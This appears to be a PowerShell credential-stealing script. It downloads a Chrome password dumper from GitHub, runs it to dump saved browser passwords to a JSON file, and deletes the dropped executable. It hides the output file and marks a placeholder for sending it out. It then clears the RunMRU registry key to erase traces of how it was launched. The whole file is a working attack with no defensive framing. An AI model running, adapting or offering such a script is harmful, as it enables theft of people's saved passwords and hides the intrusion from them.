$username = $env:UserName;
$url = "https://github.com/BudiNverse/chrome-pwd-dumper-rs/releases/download/0.3.0/chrome-pwd-dumper.exe";
$path = "C:\Users\{0}\AppData\Roaming\cpd.exe" -f $username;
$cmd = "{0} -f json x" -f $path;
Invoke-WebRequest -Uri $url -OutFile $path;
Invoke-Expression $cmd;
Remove-Item $path;
Set-ItemProperty -Path .\x.json -Name attributes -Value 6;
# send
Set-ItemProperty -Path .\x.json -Name attributes -Value 0;
# Remove-Item x.json

$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
$arr = Get-ItemPropertyValue $path -Name MRUList;
Set-ItemProperty -Path $path -Name MRUList -Value "";
foreach ($x in $arr.ToCharArray()) {
    Remove-ItemProperty -Path $path -Name $x;
}
